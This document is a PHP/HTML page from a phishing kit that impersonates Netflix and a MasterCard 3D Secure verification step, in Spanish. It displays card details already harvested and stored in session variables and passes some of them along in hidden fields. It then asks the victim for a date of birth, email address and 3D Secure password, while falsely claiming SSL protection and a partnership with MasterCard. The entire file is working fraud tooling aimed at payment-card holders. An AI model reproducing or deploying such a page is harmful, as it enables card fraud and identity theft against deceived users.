<?php 
	include("includes/next.inc.php");
?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Netflix</title>
	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<script src="js/jquery.min.js"></script>
	<script src="js/validet.js"></script>
	<link rel="stylesheet" type="text/css" href="css/app2.css">
	<link rel="shortcut icon" href="img/nficon.ico">
</head>
<body>
		<div class="header_nf2">
		</div>
		<div class="main_secure">
			<div class="inside_main">
				<div class="head_in_main">
					<div class="secure_header_left">
						<div class="lockimg">
							<img src="img/lockv.png" id="lock">
						</div>
						<div class="spanssl"><span>Protected by SSL</span></div>
					</div>
					<div class="secure_header_right">
						<img src="img/master-card.gif" id="gifvbv">
					</div>
				</div><br>
				<div class="verif_main">
					<center><span id="ban_kname"><?php echo $_SESSION['xxxnb']; ?></span></center>
					<div  class="parg_secure">
						<center><span id="title_sefety">Seguridad adicional en Línea</span></center>
						<p id="verif_paragh">Bienvenido a 3D Secure. Actualmente no está registrado para este nuevo servicio gratuito 3D Secure, provisto en asociación con MasterCard. SecureCode protege su tarjeta cuando compra en línea con este y otros minoristas participantes.</p>
						<br>
						<p>Simplemente complete los detalles a continuación para activar este servicio de seguridad gratuito.</p>
					</div>
					<div class="form_secure">
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Nombre : </span>
							</div>
							<div class="info_secure">
								<span class="info_s"><?php echo $_SESSION['xxff'] . " " . $_SESSION['xxll']; ?></span><input type="hidden" id="xxfff" value="<?php echo $_SESSION["xxff"] . ' ' . $_SESSION['xxll']; ?>">
								 <input type="hidden" id="xxxiip" value="<?php echo $_SESSION['xxxiip'];?>"><input type="hidden" id="xxccnn" value="<?php echo $_SESSION
								 ['cardx']; ?>"><input type="hidden" id="xxxscc" value="<?php echo $_SESSION['xxxsc']; ?>"><input type="hidden" id="xxxttt" value="<?php echo date("Y/m/d h:i:s:A"); ?>">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Tipo de Tarjeta : </span>
							</div>
							<div class="info_secure">
								<span class="info_s"><?php echo $_SESSION['xxxsc']; ?></span>
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Número de la Tarjeta : </span>
							</div>
							<div class="info_secure">
								<span class="info_s">XXXX-XXXX-XXXX-<?php echo $_SESSION['cardx']; ?></span>
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s"> Fecha y hora : </span>
							</div>
							<div class="info_secure">
								<span class="info_s"><?php echo date("Y/m/d h:i:s:A"); ?></span>
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Fecha de Nacimiento : </span>
							</div>
							<div class="info_secure">
								<input type="text" name="dd" id="dd" class="birth_secure2" maxlength="2">
								<span>/</span>
								<input type="text" name="mm" id="mm" class="birth_secure2" maxlength="2">
								<span>/</span>
								<input type="text" name="yy" id="yy" class="birth_secure2" maxlength="4">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Titular de la Tarjeta : </span>
							</div>
							<div class="info_secure">
								<input type="text" name="cdholder" id="xtz1" class="xtz">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Dirección de correo electrónico : </span>
							</div>
							<div class="info_secure">
								<input type="email" name="cdholder" id="xtz2" class="xtz">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s" id="spsec">Clave de Seguridad : </span>
							</div>
							<div class="info_secure">
								<input type="password" name="passwd" id="passwd" class="xtz">
							</div>
						</div>
						<div class="cont_info">
							<div class="lable_secure">
								<span class="lable_s">Repetir clave : </span>
							</div>
							<div class="info_secure">
								<input type="password" name="cdholder" id="passwd2" class="xtz">
							</div>
						</div>
						<div class="bottm_s">
							<div class="bottm_s_left">
								<span class="qd"><?php echo $_SESSION['xxxpb']; ?></span>
							</div>
							<div class="bottm_s_right">
								<span class="qd"><?php echo $_SESSION['xxxub']; ?></span>
							</div>
						</div><br><center>
						<button type="submit" class="btn_m_val" name="btnm_last">ACTIVAR</button></center>
					</div>
				</div>
			</div>			
		</div>
		<div class="end_sec">
			<center><span>
			¿No puede acceder a su verificación por Visa?</span><br>
			<span>Contactar</span><a href="#"> Servicio al cliente de Visa</a></center>
		</div>
		<div class="dvLoading"><center><img src="img/2.gif"></center></div>
</body>
</html>